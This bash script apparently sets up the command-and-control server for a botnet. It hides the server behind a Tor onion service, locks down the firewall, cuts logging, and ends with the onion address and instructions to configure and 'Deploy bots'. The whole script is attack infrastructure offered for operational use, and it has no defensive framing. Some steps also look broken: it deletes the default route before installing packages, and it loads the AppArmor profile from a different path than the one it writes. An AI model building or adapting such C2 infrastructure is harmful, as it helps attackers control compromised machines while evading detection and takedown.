#!/bin/bash

# =============================================================================
# setup_c2.sh — Tor C2 Hardening & Onion Service Setup
# =============================================================================
# This script hardens the C2 machine and configures a Tor hidden service.
# Run as root on a clean Debian/Ubuntu server.
# =============================================================================


if [ "$EUID" -ne 0 ]; then
    echo "[-] Must run as root. Use: sudo $0"
    exit 1
fi

echo ""
echo "  C2 Infrastructure Hardening Script"
echo "  ─────────────────────────────────"
echo ""

# --- Phase 1: System Hardening ---

echo "[*] Phase 1: System Hardening"

# Disable IPv6 if not needed (prevents leaks)
cat >> /etc/sysctl.d/99-c2-hardening.conf << 'EOF'
# C2 Hardening - IPv6 disable
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1

# Hardened network stack
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_rfc1337 = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.default.secure_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.icmp_echo_ignore_all = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
net.ipv4.tcp_timestamps = 0
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.log_martians = 1
net.core.bpf_jit_enable = 1
kernel.kptr_restrict = 2
kernel.dmesg_restrict = 1
kernel.printk = 3 3 3 3
EOF

sysctl -p /etc/sysctl.d/99-c2-hardening.conf 2>/dev/null || true

# Remove any default gateway that wouldn't go through Tor
ip route del default 2>/dev/null || true

# --- Phase 2: Tor Installation & Hardened Config ---

echo "[*] Phase 2: Installing & Configuring Tor"

apt-get update -qq
apt-get install -y -qq tor obfs4proxy python3-pip python3-venv apparmor apparmor-profiles ufw fail2ban

# Stop tor for config
systemctl stop tor 2>/dev/null || true

# Create necessary directories
mkdir -p /var/lib/tor/c2
chown -R debian-tor:debian-tor /var/lib/tor/c2
chmod 700 /var/lib/tor/c2

# Backup original torrc
cp /etc/tor/torrc /etc/tor/torrc.bak 2>/dev/null || true

cat > /etc/tor/torrc << 'HARDENED_TORRC'
## C2 Hardened Tor Configuration
## Based on Tor Project hardening guidelines

## Base Configuration
User debian-tor
PIDFile /run/tor/tor.pid

## Hidden Service for C2
HiddenServiceDir /var/lib/tor/c2/
HiddenServicePort 80 127.0.0.1:8080

## Security: Deny all non-hidden-service inbound connections
SOCKSPort 0
ControlPort 0
HTTPTunnelPort 0
TransPort 0
DNSPort 0
NATDPort 0

## Security: Strict node selection — only use guard/middle nodes
StrictNodes 1

## Security: Enable all anti-censorship transports (connection bootstrap)
ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy

## Security: Do not exit — we only host services, never relay
ExitRelay 0
ExitPolicy reject *:*
ExitPolicy reject6 *:*

## Security: Disable unused features
DisableDebuggerAttachment 1
FetchServerDescriptors 0
FetchHidServDescriptors 1
FetchUselessDescriptors 0

## Security: Hardened circuits
NewCircuitPeriod 600
MaxCircuitDirtiness 600
CircuitBuildTimeout 30
LearnCircuitBuildTimeout 0

## Security: Limit general OR connections (we don't route traffic)
ConnLimit 60
ClientOnly 1

## Security: Disable DNS, we use IPs only
ServerDNSResolvConf /dev/null
ClientDNSRejectInternalAddresses 1

## Security: Logging
Log notice file /var/log/tor/tor.log
Log warn syslog
SafeLogging 1

## Anti-leak protections
VirtualAddrNetworkIPv4 10.192.0.0/10
AutomapHostsOnResolve 1

## Performance: Keep hidden service descriptor fresh
HiddenServiceVersion 3
HiddenServiceNumIntroductionPoints 5

## Hardening: Avoid predictable paths
PathBiasCircThreshold 5
HARDENED_TORRC

chmod 644 /etc/tor/torrc
chown root:debian-tor /etc/tor/torrc

# --- Phase 3: Firewall (UFW) ---

echo "[*] Phase 3: Configuring Firewall"

ufw --force reset
ufw default deny incoming
ufw default deny outgoing

# Tor needs outbound to bootstrap
ufw allow out on any to any port 443 proto tcp comment 'Tor TLS outbound'
ufw allow out on any to any port 9001:9002 proto tcp comment 'Tor OR outbound'
ufw allow out on any to any port 53 proto udp comment 'DNS bootstrap only'

# Local management SSH — CHANGE THIS PORT
ufw allow in on lo to any comment 'Local loopback'
ufw allow in from 127.0.0.1 to any port 8080 proto tcp comment 'C2 local'

# Deny everything else
ufw deny out on any to any
ufw deny in on any to any

ufw --force enable
ufw status verbose

# --- Phase 4: fail2ban (basic) ---

echo "[*] Phase 4: Installing fail2ban"

cat > /etc/fail2ban/jail.local << 'FAIL2BAN'
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 5

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 86400
FAIL2BAN

systemctl enable fail2ban
systemctl restart fail2ban

# --- Phase 5: AppArmor ---

echo "[*] Phase 5: Enforcing AppArmor"

cat > /etc/apparmor.d/local/usr.bin.tor << 'APPARMOR_TOR'
# C2 Tor AppArmor profile
/usr/bin/tor {
  /etc/tor/torrc r,
  /var/lib/tor/c2/** rwk,
  /var/log/tor/tor.log rw,
  /run/tor/tor.pid rwk,
  /usr/bin/obfs4proxy ix,
  network inet stream,
  network inet6 stream,
}
APPARMOR_TOR

apparmor_parser -r /etc/apparmor.d/usr.bin.tor 2>/dev/null || true
systemctl restart apparmor

# --- Phase 6: C2 Python Dependencies ---

echo "[*] Phase 6: Installing C2 Python Environment"

pip3 install flask waitress requests cryptography pysocks 2>/dev/null || true

# --- Phase 7: Disable Unused Services ---

echo "[*] Phase 7: Disabling Unused Services"

for svc in avahi-daemon cups bluetooth whoopsie; do
    systemctl disable --now $svc 2>/dev/null || true
done

# --- Phase 8: Additional Kernel & Memory Protections ---

echo "[*] Phase 8: Memory & Kernel Hardening"

# Disable core dumps
echo "* hard core 0" > /etc/security/limits.d/99-disable-core.conf
echo "fs.suid_dumpable = 0" >> /etc/sysctl.d/99-c2-hardening.conf

# Enable ASLR
echo "kernel.randomize_va_space = 2" >> /etc/sysctl.d/99-c2-hardening.conf

sysctl -p /etc/sysctl.d/99-c2-hardening.conf 2>/dev/null

# --- Phase 9: Remove SSH password auth ---

echo "[*] Phase 9: Hardening SSH"

sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^#PermitRootLogin yes/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
sed -i 's/^PermitRootLogin yes/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
systemctl restart sshd

# --- Phase 10: Logging reduction ---

echo "[*] Phase 10: Reducing Attack Surface Logging"

# Only log critical events
cat > /etc/rsyslog.d/99-c2.conf << 'RSYSLOG'
# C2: Only critical messages
*.crit;auth,authpriv.none   /var/log/syslog
*.info;mail.none;authpriv.none;cron.none   /var/log/messages
RSYSLOG

systemctl restart rsyslog

# --- Phase 11: Start Tor & Display Onion ---

echo "[*] Phase 11: Starting Tor Hidden Service"

systemctl daemon-reload
systemctl enable tor
systemctl start tor

sleep 3

if [ -f /var/lib/tor/c2/hostname ]; then
    ONION=$(cat /var/lib/tor/c2/hostname)
    echo ""
    echo "  ───────────────────────────────────────"
    echo "  [+] TOR HIDDEN SERVICE ACTIVE"
    echo "  [+] C2 Onion Address: $ONION"
    echo "  [+] C2 listens locally on :8080"
    echo "  [+] Configure bots with:"
    echo "      C2_ONION = \"$ONION\""
    echo "      SHARED_SECRET = \"<from C2 output>\""
    echo "  ───────────────────────────────────────"
    echo ""
else
    echo "[-] Waiting for Tor to generate onion address..."
    sleep 5
    if [ -f /var/lib/tor/c2/hostname ]; then
        ONION=$(cat /var/lib/tor/c2/hostname)
        echo "[+] C2 Onion Address: $ONION"
    else
        echo "[-] Check: journalctl -u tor --no-pager | tail -20"
    fi
fi

# --- Summary ---

echo ""
echo "  ───────────────────────────────────────"
echo "  C2 Infrastructure Hardening Complete"
echo "  ───────────────────────────────────────"
echo "  [+] Tor hidden service configured"
echo "  [+] Firewall: UFW active (deny all except Tor TLS)"
echo "  [+] fail2ban: SSH brute-force protection"
echo "  [+] AppArmor: Tor confined"
echo "  [+] IPv6 disabled (prevents leaks)"
echo "  [+] ASLR, no core dumps, kernel hardening"
echo "  [+] SSH: password auth disabled"
echo "  [+] Minimal logging"
echo ""
echo "  Next steps:"
echo "  1. python3 c2.py"
echo "  2. Edit bot payloads with C2_ONION and SHARED_SECRET"
echo "  3. Deploy bots"
echo "  ───────────────────────────────────────"
echo ""
